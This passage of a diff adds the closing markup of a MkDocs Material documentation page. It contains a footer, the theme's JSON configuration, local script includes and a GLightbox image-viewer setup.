1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "toc.follow", "content.code.copy", "content.code.annotate", "content.action.edit", "content.action.view", "content.tabs.link", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../assets/lang-switch.js"></script>
+      
+    
+  
+<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(()=>{ lightbox.reload(); });
+</script></body></html>
